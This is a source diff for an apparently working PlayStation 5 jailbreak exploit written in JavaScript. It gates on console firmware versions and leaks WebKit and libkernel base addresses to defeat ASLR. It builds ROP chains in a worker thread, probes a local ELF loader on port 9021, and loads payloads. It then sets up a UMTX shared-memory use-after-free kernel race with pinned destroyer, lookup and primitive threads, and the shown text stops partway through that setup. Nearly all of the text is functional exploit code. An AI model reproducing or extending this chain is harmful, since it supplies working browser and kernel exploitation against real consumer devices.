@@ -1,34 +1,52 @@
+// @ts-check
+
+//Common chain
+let chain;
+//Bases
+let libSceNKWebKitBase;
+let libSceLibcInternalBase;
+let libKernelBase;
+//ASLR defeat patsy (former vtable buddy)
+let textArea = document.createElement("textarea");
+
 if (!navigator.userAgent.includes('PlayStation 5')) {
     alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
     throw new Error("");
 }
 
-const supportedFirmwares = ["4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
+const supportedFirmwares = ["1.00", "1.01", "1.02", "1.05", "1.10", "1.11", "1.12", "1.13", "1.14", "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "2.70", "3.00", "3.10", "3.20", "3.21", "4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
 const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
 window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
 window.fw_float = parseFloat(fw_str);
 
+//load offsets & webkit exploit after.
 if (!supportedFirmwares.includes(fw_str)) {
-    // @ts-ignore
     alert(`This firmware(${fw_str}) is not supported.`);
     throw new Error("");
 }
 
 let nogc = [];
+let syscalls = {};
+let gadgets = {};
+
 
 let worker = new Worker("rop_slave.js");
-function build_addr(p, buf, family, port, addr) {
-    p.write1(buf.add32(0x00), 0x10);
-    p.write1(buf.add32(0x01), family);
-    p.write2(buf.add32(0x02), port);
-    p.write4(buf.add32(0x04), addr);
+
+//Make sure worker is alive?
+async function wait_for_worker() {
+    let p1 = await new Promise((resolve) => {
+        const channel = new MessageChannel();
+        channel.port1.onmessage = () => {
+            channel.port1.close();
+            resolve(1);
+        }
+        worker.postMessage(0, [channel.port2]);
+    });
+    return p1;
 }
 
-function htons(port) {
-    return ((port & 0xFF) << 8) | (port >>> 8);
-}
+function find_worker() {
 
-function find_worker(p, libKernelBase) {
     const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
     const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
@@ -40,49 +58,12 @@ function find_worker(p, libKernelBase) {
             return stack;
         }
     }
-    throw new Error("failed to find worker.");
+    alert("failed to find worker.");
 }
 
-var LogLevel = {
-    DEBUG: 0,
-    INFO: 1,
-    LOG: 2,
-    WARN: 3,
-    ERROR: 4,
-    SUCCESS: 5,
-
-    FLAG_TEMP: 0x1000
-};
-
-let consoleElem = null;
-let lastLogIsTemp = false;
-function log(string, level) {
-    if (consoleElem === null) {
-        consoleElem = document.getElementById("console");
-    }
-
-    const isTemp = level & LogLevel.FLAG_TEMP;
-    level = level & ~LogLevel.FLAG_TEMP;
-    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];
-
-    if (isTemp && lastLogIsTemp) {
-        const lastChild = consoleElem.lastChild;
-        if (lastChild) lastChild.innerText = string;
-        if (lastChild) lastChild.className = elemClass;
-        return;
-    } else if (isTemp) {
-        lastLogIsTemp = true;
-    } else {
-        lastLogIsTemp = false;
-    }
-
-    let logElem = document.createElement("div");
-    logElem.innerText = string;
-    logElem.className = elemClass;
-    consoleElem.appendChild(logElem);
-
-    // scroll to bottom
-    consoleElem.scrollTop = consoleElem.scrollHeight;
+function print(string) {
+    document.getElementById("console").innerHTML += string + "\n";
+    document.getElementById("console").scrollTop = document.getElementById("console").scrollHeight;
 }
 
 const AF_INET = 2;
@@ -92,27 +73,32 @@ const SOCK_DGRAM = 2;
 const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 const IPV6_PKTINFO = 46;
-async function prepare(p) {
-    //ASLR defeat patsy (former vtable buddy)
-    let textArea = document.createElement("textarea");
+
+async function main(wkOnly = false) {
+    p.pre_chain = pre_chain;
+    p.launch_chain = launch_chain;
+    p.malloc = malloc;
+    p.malloc_dump = malloc_dump;
+    p.stringify = stringify;
+    p.array_from_address = array_from_address;
+    p.readstr = readstr;
+    p.writestr = writestr;
 
     //pointer to vtable address
     let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
-
     //address of vtable
     let textAreaVtable = p.read8(textAreaVtPtr);
-
     //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
-    let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
+    libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
+    //debug_log("webkit base: 0x" + libSceNKWebKitBase);
 
-    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
+    libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
     libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
 
-    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
+    libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
     libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
 
-    let gadgets = {};
-    let syscalls = {};
+    //debug_log("libkernel base: 0x" + libKernelBase);
 
     for (let gadget in wk_gadgetmap) {
         gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
@@ -121,47 +107,49 @@ async function prepare(p) {
         syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
     }
 
-    let nogc = [];
-
     function malloc_dump(sz) {
         let backing;
         backing = new Uint8Array(sz);
         nogc.push(backing);
-        /** @type {any} */
         let ptr = p.read8(p.leakval(backing).add32(0x10));
         ptr.backing = backing;
         return ptr;
     }
+
     function malloc(sz, type = 4) {
         let backing;
         if (type == 1) {
-            backing = new Uint8Array(1000 + sz);
+            backing = new Uint8Array(1000 + sz); // 1000 is fastSizeLimit in jsc, i just set this to be safe
         } else if (type == 2) {
-            backing = new Uint16Array(0x2000 + sz);
+            backing = new Uint16Array(0x10000 + sz);
         } else if (type == 4) {
             backing = new Uint32Array(0x10000 + sz);
         }
         nogc.push(backing);
-        /** @type {any} */
         let ptr = p.read8(p.leakval(backing).add32(0x10));
         ptr.backing = backing;
         return ptr;
     }
 
     function array_from_address(addr, size) {
-        let og_array = new Uint8Array(1001);
+        let og_array = new Uint32Array(0x1000);
         let og_array_i = p.leakval(og_array).add32(0x10);
 
-        function setAddr(newAddr, size) {
-            p.write8(og_array_i, newAddr);
-            p.write4(og_array_i.add32(0x8), size);
-            p.write4(og_array_i.add32(0xC), 0x1);
-        }
+        p.write8(og_array_i, addr);
+        p.write4(og_array_i.add32(0x8), size);
+        p.write4(og_array_i.add32(0xC), 0x1);
 
-        setAddr(addr, size);
+        nogc.push(og_array);
+        return og_array;
+    }
 
-        // @ts-ignore
-        og_array.setAddr = setAddr;
+    function u8array_from_address(addr, size) {
+        let og_array = new Uint8Array(0x10000 + size);
+        let og_array_i = p.leakval(og_array).add32(0x10);
+
+        p.write8(og_array_i, addr);
+        p.write4(og_array_i.add32(0x8), size);
+        p.write4(og_array_i.add32(0xC), 0x1);
 
         nogc.push(og_array);
         return og_array;
@@ -172,17 +160,15 @@ async function prepare(p) {
         for (let i = 0; i < str.length; i++) {
             bufView[i] = str.charCodeAt(i) & 0xFF;
         }
-        // nogc.push(bufView);
-        /** @type {any} */
+        nogc.push(bufView);
         let ptr = p.read8(p.leakval(bufView).add32(0x10));
         ptr.backing = bufView;
         return ptr;
     }
 
-    function readstr(addr, maxlen = -1) {
+    function readstr(addr) {
         let str = "";
         for (let i = 0; ; i++) {
-            if (maxlen != -1 && i >= maxlen) { break; }
             let c = p.read1(addr.add32(i));
             if (c == 0x0) {
                 break;
@@ -209,24 +195,29 @@ async function prepare(p) {
         p.write1(waddr, 0x0);
     }
 
-    // Make sure worker is alive?
-    async function wait_for_worker() {
 
-        return new Promise((resolve) => {
-            worker.onmessage = function (e) {
-                resolve(1);
-            }
-            worker.postMessage(0);
-        });
-
+    function htons(port) {
+        return ((port & 0xFF) << 8) | (port >>> 8);
     }
 
-    // Worker already initialized at line 19
-    
-    await wait_for_worker();
+    function aton(ip) {
+        let chunks = ip.split('.');
+        let addr = 0;
+        for (let i = 0; i < 4; i++) {
+            addr |= (parseInt(chunks[i]) << (i * 8));
+        }
+        return addr >>> 0;
+    }
+    function build_addr(buf, family, port, addr) {
+        p.write1(buf.add32(0x00), 0x10);
+        p.write1(buf.add32(0x01), family);
+        p.write2(buf.add32(0x02), port);
+        p.write4(buf.add32(0x04), addr);
+    }
 
-    let worker_stack = find_worker(p, libKernelBase);
-    let original_context = malloc(0x40);
+    await wait_for_worker();
+    let worker_stack = find_worker();
+    let original_context = p.malloc(0x40);
 
     let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
     let original_return_address = p.read8(return_address_ptr);
@@ -254,64 +245,24 @@ async function prepare(p) {
         p.write8(stack_pointer_ptr, chain.stack_entry_point);
 
         let p1 = await new Promise((resolve) => {
-            worker.onmessage = function (e) {
+            const channel = new MessageChannel();
+            channel.port1.onmessage = () => {
+                channel.port1.close();
                 resolve(1);
             }
-            worker.postMessage(0);
+            worker.postMessage(0, [channel.port2]);
         });
-        if (p1 == 0) {
-            throw new Error("The rop thread ran away. ");
+        if (p1 === 0) {
+            alert("The rop thread ran away. ");
+            p.write8(0, 0);
         }
     }
 
-    /** @type {WebkitPrimitives} */
-    let p2 = {
-        write8: p.write8,
-        write4: p.write4,
-        write2: p.write2,
-        write1: p.write1,
-        read8: p.read8,
-        read4: p.read4,
-        read2: p.read2,
-        read1: p.read1,
-        leakval: p.leakval,
-        pre_chain: pre_chain,
-        launch_chain: launch_chain,
-        malloc_dump: malloc_dump,
-        malloc: malloc,
-        stringify: stringify,
-        array_from_address: array_from_address,
-        readstr: readstr,
-        writestr: writestr,
-        libSceNKWebKitBase: libSceNKWebKitBase,
-        libSceLibcInternalBase: libSceLibcInternalBase,
-        libKernelBase: libKernelBase,
-        nogc: nogc,
-        syscalls: syscalls,
-        gadgets: gadgets
-    };
-
-    let chain = new worker_rop(p2);
-
-    let pid = await chain.syscall(SYS_GETPID);
-
-    //Sanity check
-    if (pid.low == 0) {
-        throw new Error("Webkit exploit failed.");
-    }
-
-    return { p: p2, chain: chain };
-}
-
-async function main(userlandRW, wkOnly = false) {
-    const debug = false;
-
-    const { p, chain } = await prepare(userlandRW);
-    if (debug) await log("Chain initialized", LogLevel.DEBUG);
+    chain = new worker_rop();
 
     async function get_local_ips() {
         // i used this as reference for the undocumented NETGETIFLIST call
-        // the if_addr object is 0x3C0 bytes instead of 0x140
+        // the main difference is the if_addr object is 0x3C0 bytes instead of 0x140
         // https://github.com/robots/wifimon-vita/blob/a4359efd59081fb92978b8852ca7902879429831/src/app/main.c#L17
 
         const SYSCALL_NETGETIFLIST = 0x07D;
@@ -356,12 +307,34 @@ async function main(userlandRW, wkOnly = false) {
         return iplist;
     }
 
-    
-    let ip_list = await get_local_ips();
-    let ip = ip_list.find(obj => obj.ip != "0.0.0.0");
-    if (typeof ip === "undefined" || !ip.ip) {
-        ip = { ip: "", name: "Offline" };
+    window.ip_list = await get_local_ips();
+    window.ip = window.ip_list.find(obj => obj.ip != "0.0.0.0");
+    if (!window.ip) {
+        window.ip = { ip: "", name: "Offline" };
     }
+
+    // async function probe_sb_elfldr() {
+    //     let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
+    //     if (fd <= 0) {
+    //         return false;
+    //     }
+
+    //     let addr = p.malloc(0x10);
+    //     // let localhost = aton("127.0.0.1");
+    //     // alert("localhost: " + localhost.toString(16));
+    //     build_addr(addr, AF_INET, htons(9021), 0x0100007F);
+    //     let connect_res = (await chain.syscall(SYS_CONNECT, fd, addr, 0x10)).low << 0;
+    //     if (connect_res < 0) {
+    //         await chain.syscall(SYS_CLOSE, fd);
+    //         return false;
+    //     }
+
+    //     // send something otherwise elfldr will get stuck
+    //     let write_res = (await chain.syscall(SYS_WRITE, fd, addr, 0x1)).low << 0;
+
+    //     await chain.syscall(SYS_CLOSE, fd);
+    //     return true;
+    // }
 
     async function probe_sb_elfldr() {
         // if the bind fails, elfldr is running so return true
@@ -371,7 +344,7 @@ async function main(userlandRW, wkOnly = false) {
         }
 
         let addr = p.malloc(0x10);
-        build_addr(p, addr, AF_INET, htons(9021), 0x0100007F);
+        build_addr(addr, AF_INET, htons(9021), 0x0100007F);
         let bind_res = (await chain.syscall(SYS_BIND, fd, addr, 0x10)).low << 0;
         await chain.syscall(SYS_CLOSE, fd);
         if (bind_res < 0) {
@@ -382,7 +355,7 @@ async function main(userlandRW, wkOnly = false) {
     }
 
     let is_elfldr_running = await probe_sb_elfldr();
-    await log("is elfldr running: " + is_elfldr_running, LogLevel.INFO);
+    debug_log("[+] is elfldr running: " + is_elfldr_running);
     if (wkOnly && !is_elfldr_running) {
         let res = confirm("elfldr doesnt seem to be running and in webkit only mode it wont be loaded, continue?");
         if (!res) {
@@ -400,8 +373,8 @@ async function main(userlandRW, wkOnly = false) {
     populatePayloadsPage(wkOnly);
 
     var load_payload_into_elf_store_from_local_file = async function (filename) {
-        await log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
-        const response = await fetch(filename);
+        debug_log("[+] Loading ELF file: " + filename + " ...")
+        const response = await fetch('payloads/' + filename);
         if (!response.ok) {
             throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
         }
@@ -419,6 +392,9 @@ async function main(userlandRW, wkOnly = false) {
             throw new Error(`Unsupported backing array type. BYTES_PER_ELEMENT: ${elf_store.backing.BYTES_PER_ELEMENT}`);
         }
 
+        // zero out elf_store.backing
+        elf_store.backing.fill(0);
+
         elf_store.backing.set(byteArray);
         return byteArray.byteLength;
     }
@@ -429,77 +405,1190 @@ async function main(userlandRW, wkOnly = false) {
     var elf_store = p.malloc(elf_store_size, 1);
 
     if (!wkOnly) {
-        var krw = await runUmtx2Exploit(p, chain, log);
+        function debug_bin(bin) {
+            let xhr = new XMLHttpRequest();
+            xhr.open('POST', 'a.bin', false);
+            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
+            xhr.send(bin);
+        }
+
+        async function pin_to_core(core) {
+            let level = 3;
+            let which = 1;
+            let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
+            let setsize = 0x10;
+            let mask = p.malloc(0x10, 1);
+            p.write2(mask, 1 << core);
+
+            return await chain.syscall(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
+        }
+
+        function thread_pin_to_core(thread, core) {
+            let level = 3;
+            let which = 1;
+            let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
+            let setsize = 0x10;
+            let mask = p.malloc(0x10, 1);
+            p.write2(mask, 1 << core);
+
+            thread.self_healing_syscall(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
+        }
+
+        async function set_rtprio(prio) {
+            let rtprio = p.malloc(0x4, 1);
+            p.write2(rtprio.add32(0x0), 0x2);
+            p.write2(rtprio.add32(0x2), prio);
+
+            return await chain.syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
+        }
+
+        async function thread_set_rtprio(thread, prio) {
+            let rtprio = p.malloc(0x4, 1);
+            p.write2(rtprio.add32(0x0), 0x2);
+            p.write2(rtprio.add32(0x2), prio);
+
+            thread.self_healing_syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
+        }
+
+        async function sleep(secs) {
+            return await chain.call(libKernelBase.add32(OFFSET_lk_sleep), secs); // sleep 1s
+        }
+
+        async function nanosleep(nsecs) {
+            p.write8(nanosleep.args.add32(0x00), 0);     // tv_sec
+            p.write8(nanosleep.args.add32(0x08), nsecs); // tv_nsec
+            return await chain.syscall(SYS_NANOSLEEP, nanosleep.args, nanosleep.args);
+        }
+        nanosleep.args = p.malloc(0x10, 1);
+
+
+        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        // KERNEL EXPLOIT BEGINS
+        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        ///////////////////////////////////////////////////////////////////////
+        // Setup
+        ///////////////////////////////////////////////////////////////////////
+
+        // Config
+        let cfg_num_kprim_threads = 0x200;
+        let cfg_spray_fds_per_thread = 0x28;
+
+        // Define consts
+        let UMTX_OP_SHM = 26; // 25 on BSD
+        let UMTX_SHM_CREAT = 0x0001;
+        let UMTX_SHM_LOOKUP = 0x0002;
+        let UMTX_SHM_DESTROY = 0x0004;
+
+        // Create a UMTX key area to use, these just have to be valid pointers
+        let shm_key = p.malloc(0x1000);
+
+        /*
+         * Thread setup:
+         * 11 - main thread (core 11, high prio) 
+         * 13 - destroyer 0 (core 13, high prio)
+         * 14 - destroyer 1 (core 14, high prio)
+         * 15 - lookup (core 15, low prio)
+         */
+        const cfg_thread_main = { core: 11, prio: 256 };
+        const cfg_thread_destroyer_0 = { core: 13, prio: 256 };
+        const cfg_thread_destroyer_1 = { core: 14, prio: 256 };
+        const cfg_thread_lookup = { core: 15, prio: 767 };
+
+        // Pin main thread to core 1 with high prio
+        await pin_to_core(cfg_thread_main.core);
+        await set_rtprio(cfg_thread_main.prio);
+
+        debug_log("[+] main thread on cpu=0x" + await chain.call(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu)));
+
+        // Get pid for searching for this process later
+        let our_pid = await chain.syscall(SYS_GETPID);
+        debug_log("[+] pid=0x" + our_pid);
+
+        // Create pipe for read/write prim via stack reads/writes
+        const pipe_size = 0x10000;
+        let pipe_slow_fds = p.malloc(0x8, 1);
+        let pipe_scratch_buf = p.malloc(0x10000);
+        await chain.syscall(SYS_PIPE2, pipe_slow_fds, 0);
+
+        let pipe_slow_read_fd = p.read4(pipe_slow_fds.add32(0x0));
+        let pipe_slow_write_fd = p.read4(pipe_slow_fds.add32(0x4));
+        //debug_log("[+] created slow pipe 0x" + pipe_slow_read_fd.toString(16) + " <-> 0x" + pipe_slow_write_fd.toString(16));
+
+        /*
+         * Variables for kernel prim thread communication
+         */
+        let kprim_thread_data_neo_found = p.malloc(0x8);
+        p.write8(kprim_thread_data_neo_found, 0);
+        let kprim_thread_data_neo = p.malloc(0x8);
+        p.write8(kprim_thread_data_neo, new int64(0xFFFFFFFF, 0xFFFFFFFF));
+        let kprim_thread_data_reset = p.malloc(0x8);
+        p.write8(kprim_thread_data_reset, 0);
+
+        let kprim_thread_data_cmd = p.malloc(0x8);
+        p.write8(kprim_thread_data_cmd, 0);
+        let kprim_thread_data_uaddr = p.malloc(0x8);
+        let kprim_thread_data_kaddr = p.malloc(0x8);
+
+        let kprim_thread_data_read_counter = p.malloc(0x8);
+        p.write8(kprim_thread_data_read_counter, 0);
+
+        let kprim_thread_data_write_counter = p.malloc(0x8);
+        p.write8(kprim_thread_data_write_counter, 0);
+
+        let kprim_thread_data_exit_bmp = p.malloc(cfg_num_kprim_threads * 0x8);
+
+        const KPRIM_NOP = 0;
+        const KPRIM_READ = 1;
+        const KPRIM_WRITE = 2;
+
+        // Add threads for kernel primitives post-UAF
+        let kprim_threads = [];
+        let kprim_read_size = 0x8;
+        for (let i = 0; i < cfg_num_kprim_threads; i++) {
+            let thr = new thread_rop("kprim" + i, 0x1000, 0x200); {
+                thread_pin_to_core(thr, cfg_thread_lookup.core);
+
+                const label_waitforcmdorstop = thr.get_rsp();
+
+                // If the one thread has been found that reclaimed, we must exit if we're not the one
+                const cond_neofound = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_neo_found, 1);
+                const label_neocheck = thr.get_rsp();
+                const cond_neocheck = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_neo, i);
+
+                // This syscall does nothing except create a cookie in the stack so we know which thread
+                // reclaimed the UAF'd page
+                const label_do_cookie = thr.get_rsp();
+                thr.self_healing_syscall(SYS_SCHED_YIELD, 0x13370000 + i);
+                const cond_waitforcmd = thr.create_branch(thr.branch_types.ABOVE, kprim_thread_data_cmd, KPRIM_NOP);
+
+                const label_checkread = thr.get_rsp();
+                const cond_checkread = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_cmd, KPRIM_READ);
+                const label_read = thr.get_rsp();
+                thr.increment_dword(kprim_thread_data_read_counter);
+                thr.self_healing_syscall(SYS_WRITE, pipe_slow_write_fd, pipe_scratch_buf, kprim_read_size);
+
+                const label_checkwrite = thr.get_rsp();
+                const cond_checkwrite = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_cmd, KPRIM_WRITE);
+                const label_write = thr.get_rsp();
+                thr.increment_dword(kprim_thread_data_write_counter);
+                thr.self_healing_syscall(SYS_READ, pipe_slow_read_fd, pipe_scratch_buf, kprim_read_size);
+
+                const label_waitreset = thr.get_rsp();
+                const cond_waitreset = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_reset, 1);
+                const label_reset = thr.get_rsp();
+                thr.jmp_to_rsp(label_waitforcmdorstop);
+
+                const label_exit = thr.get_rsp();
+                thr.push_write8(kprim_thread_data_exit_bmp.add32(i * 0x8), 1);
+                //thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0x11223344);
+
+                thr.set_branch_points(cond_neofound, label_neocheck, label_do_cookie);
+                thr.set_branch_points(cond_neocheck, label_do_cookie, label_exit);
+                thr.set_branch_points(cond_waitforcmd, label_checkread, label_waitforcmdorstop);
+                thr.set_branch_points(cond_checkread, label_read, label_checkwrite);
+                thr.set_branch_points(cond_checkwrite, label_write, label_waitreset);
+                thr.set_branch_points(cond_waitreset, label_reset, label_waitreset);
+            }
+
+            kprim_threads.push(thr);
+        }
+
+        // Var for telling all threads to start running
+        let thread_data_run_all = p.malloc(0x8);
+        p.write8(thread_data_run_all, 0);
+
+        // Var for threads to update to indicate readiness (3=go time)
+        let thread_data_ready = p.malloc(0x8);
+        p.write8(thread_data_ready, 0);
+
+        // Var for allowing threads to restart
+        let thread_data_reset_all = p.malloc(0x8);
+        p.write8(thread_data_reset_all, 0);
+
+        // Destroyer shmfds
+        let thread_data_destroyer_fds = p.malloc(cfg_spray_fds_per_thread * 2 * 0x8);
+
+        // Destroyer 0 data
+        // let thread_data_destroyer_0_run = p.malloc(0x8);
+        let thread_data_destroyer_0_stop = p.malloc(0x8);
+        let thread_data_destroyer_0_counter = p.malloc(0x8);
+        let thread_data_destroyer_0_cpu = p.malloc(0x8);
+        // let thread_data_destroyer_0_spray_count = p.malloc(0x8);
+        p.write8(thread_data_destroyer_0_counter, 0);
+
+        // Destroyer 1 data
+        // let thread_data_destroyer_1_run = p.malloc(0x8);
+        let thread_data_destroyer_1_stop = p.malloc(0x8);
+        let thread_data_destroyer_1_counter = p.malloc(0x8);
+        let thread_data_destroyer_1_cpu = p.malloc(0x8);
+        // let thread_data_destroyer_1_spray_count = p.malloc(0x8);
+        p.write8(thread_data_destroyer_1_counter, 0);
+
+        // Lookup data
+        // let thread_data_lookup_run = p.malloc(0x8);
+        let thread_data_lookup_stop = p.malloc(0x8);
+        let thread_data_lookup_counter = p.malloc(0x8);
+        let thread_data_lookup_cpu = p.malloc(0x8);
+        let thread_data_lookup_fd = p.malloc(0x8);
+        p.write8(thread_data_lookup_counter, 0);
+        p.write4(thread_data_lookup_fd, 0x13371337);
+
+        function stop_all_threads() {
+            p.write8(thread_data_run_all, 0);
+            p.write8(thread_data_reset_all, 1);
+            p.write8(thread_data_destroyer_0_stop, 1);
+            p.write8(thread_data_destroyer_1_stop, 1);
+            p.write8(thread_data_lookup_stop, 1);
+        }
+
+        let thread_destroyer_0 = new thread_rop("rop_thread_destroyer0"); {
+            thread_pin_to_core(thread_destroyer_0, cfg_thread_destroyer_0.core);
+            thread_set_rtprio(thread_destroyer_0, cfg_thread_destroyer_0.prio);
+            thread_destroyer_0.fcall(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
+            thread_destroyer_0.write_result(thread_data_destroyer_0_cpu);
+
+            // Labels/code
+            const label_a = thread_destroyer_0.get_rsp();
+            const cond_stop = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_destroyer_0_stop, 1);
+
+            const label_b = thread_destroyer_0.get_rsp();
+            const cond_run = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_run_all, 1);
+
+            const label_c = thread_destroyer_0.get_rsp();
+            thread_destroyer_0.increment_dword(thread_data_ready);
+            const label_wait = thread_destroyer_0.get_rsp();
+            const cond_ready = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_ready, 3);
+
+            const label_d = thread_destroyer_0.get_rsp();
+            thread_destroyer_0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key);
+
+            for (let i = 0; i < cfg_spray_fds_per_thread * 0x2; i += 2) {
+                thread_destroyer_0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, shm_key.add32(0x8 + (0x8 * i)));
+                thread_destroyer_0.write_result(thread_data_destroyer_fds.add32(0x8 * i));
+                thread_destroyer_0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key.add32(0x8 + (0x8 * i)));
+            }
+
+            thread_destroyer_0.increment_dword(thread_data_destroyer_0_counter);
+
+            const label_waitreset = thread_destroyer_0.get_rsp();
+            const cond_waitreset = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_reset_all, 1);
+            const label_restart = thread_destroyer_0.get_rsp();
+            thread_destroyer_0.jmp_to_rsp(label_a);
+
+            const label_e = thread_destroyer_0.get_rsp();
+
+            // Set branch points
+            thread_destroyer_0.set_branch_points(cond_stop, label_e, label_b);
+            thread_destroyer_0.set_branch_points(cond_run, label_c, label_a);
+            thread_destroyer_0.set_branch_points(cond_ready, label_d, label_wait);
+            thread_destroyer_0.set_branch_points(cond_waitreset, label_restart, label_waitreset);
+        }
+
+        let thread_destroyer_1 = new thread_rop("rop_thread_destroyer1"); {
+            thread_pin_to_core(thread_destroyer_1, cfg_thread_destroyer_1.core);
+            thread_set_rtprio(thread_destroyer_1, cfg_thread_destroyer_1.prio);
+            thread_destroyer_1.fcall(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
+            thread_destroyer_1.write_result(thread_data_destroyer_1_cpu);
+
+            // Labels/code
+            const label_a = thread_destroyer_1.get_rsp();
+            const cond_stop = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_destroyer_1_stop, 1);
+
+            const label_b = thread_destroyer_1.get_rsp();
+            const cond_run = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_run_all, 1);
+
+            const label_c = thread_destroyer_1.get_rsp();
+            thread_destroyer_1.increment_dword(thread_data_ready);
+            const label_wait = thread_destroyer_1.get_rsp();
+            const cond_ready = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_ready, 3);
+
+            const label_d = thread_destroyer_1.get_rsp();
+            thread_destroyer_1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key);
+
+            for (let i = 1; i < cfg_spray_fds_per_thread * 0x2; i += 2) {
+                thread_destroyer_1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, shm_key.add32(0x8 + (0x8 * i)));
+                thread_destroyer_1.write_result(thread_data_destroyer_fds.add32(0x8 * i));
+                thread_destroyer_1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key.add32(0x8 + (0x8 * i)));
+            }
+
+            thread_destroyer_1.increment_dword(thread_data_destroyer_1_counter);
+
+            const label_waitreset = thread_destroyer_1.get_rsp();
+            const cond_waitreset = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_reset_all, 1);
+            const label_restart = thread_destroyer_1.get_rsp();
+            thread_destroyer_1.jmp_to_rsp(label_a);
+
+            const label_e = thread_destroyer_1.get_rsp();
+
+            // Set branch points
+            thread_destroyer_1.set_branch_points(cond_stop, label_e, label_b);
+            thread_destroyer_1.set_branch_points(cond_run, label_c, label_a);
+            thread_destroyer_1.set_branch_points(cond_ready, label_d, label_wait);
+            thread_destroyer_1.set_branch_points(cond_waitreset, label_restart, label_waitreset);
+        }
+
+        let thread_lookup = new thread_rop("rop_thread_lookup"); {
+            thread_pin_to_core(thread_lookup, cfg_thread_lookup.core);
+            thread_set_rtprio(thread_lookup, cfg_thread_lookup.prio);
+            thread_lookup.fcall(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
+            thread_lookup.write_result(thread_data_lookup_cpu);
+
+            // Labels/code
+            const label_a = thread_lookup.get_rsp();
+            const cond_stop = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_lookup_stop, 1);
+
+            const label_b = thread_lookup.get_rsp();
+            const cond_run = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_run_all, 1);
+
+            const label_c = thread_lookup.get_rsp();
+            thread_lookup.increment_dword(thread_data_ready);
+            const label_wait = thread_lookup.get_rsp();
+            const cond_ready = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_ready, 3);
+
+            const label_d = thread_lookup.get_rsp();
+            thread_lookup.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, shm_key);
+            thread_lookup.write_result(thread_data_lookup_fd);
